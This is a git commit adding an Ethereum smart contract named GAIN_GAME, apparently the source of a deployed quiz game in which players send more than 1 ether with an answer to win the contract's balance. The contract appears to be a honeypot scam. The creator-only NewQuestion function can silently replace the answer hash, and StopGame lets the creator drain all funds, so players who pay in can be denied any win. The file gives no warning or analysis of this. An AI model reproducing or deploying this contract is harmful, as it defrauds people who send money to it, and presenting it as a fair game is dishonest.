586ad15d23085510a2189363b5cf2f3514ee87bc
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 01:07:38 +0700

    add contract GAIN_GAME

---
+++ GAIN_GAME.sol
@@ -0,0 +1,55 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GAIN_GAME at 0xe3d085b7bdf97c6d003abcec2003b9c5b120d616
+*/
+pragma solidity ^0.4.20;
+
+contract GAIN_GAME
+{
+    function Play(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    string public question;
+ 
+    address questionSender;
+  
+    bytes32 responseHash;
+ 
+    function StartGame(string _question,string _response)
+    public
+    payable
+    {
+        if(responseHash==0x0)
+        {
+            responseHash = keccak256(_response);
+            question = _question;
+            questionSender = msg.sender;
+        }
+    }
+    
+    function StopGame()
+    public
+    payable
+    {
+       require(msg.sender==questionSender);
+       msg.sender.transfer(this.balance);
+    }
+    
+    function NewQuestion(string _question, bytes32 _responseHash)
+    public
+    payable
+    {
+        require(msg.sender==questionSender);
+        question = _question;
+        responseHash = _responseHash;
+    }
+    
+    function() public payable{}
+}
